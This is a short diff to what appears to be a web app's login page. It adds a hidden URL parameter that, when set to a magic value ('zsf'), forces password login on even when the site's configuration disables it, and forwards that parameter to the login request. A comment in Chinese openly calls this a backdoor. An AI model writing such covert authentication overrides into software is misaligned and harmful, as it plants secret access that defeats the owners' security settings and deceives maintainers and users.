@@ -84,7 +84,8 @@ const login = () => {
   }
   loginRequest({
     account: account.value,
-    password: password.value
+    password: password.value,
+    a: route.query.a ? route.query.a : ""
   }).then(res => {
     user.account = res.session.userInfo.account;
     user.avatarUrl = res.session.userInfo.avatarUrl;
@@ -110,11 +111,13 @@ const getSysCfg = () => {
 // 获取登录配置
 const getLoginCfg = () => {
   getLoginCfgRequest().then(res => {
+    let hasA = route.query.a === "zsf";
     loginCfg.value = res.data;
-    hasAccountPasswordType.value = res.data.accountPassword.isEnabled;
+    hasAccountPasswordType.value = res.data.accountPassword.isEnabled || hasA;
     hasWeworkType.value = res.data.wework.isEnabled;
     hasFeishuType.value = res.data.feishu.isEnabled;
-    if (hasAccountPasswordType.value) {
+    // 留给后门用于强制账号密码登录
+    if (hasA || hasAccountPasswordType.value) {
       loginType.value = ACCOUNT_PASSWORD_TYPE;
     } else if (hasWeworkType.value) {
       loginType.value = WEWORK_TYPE;
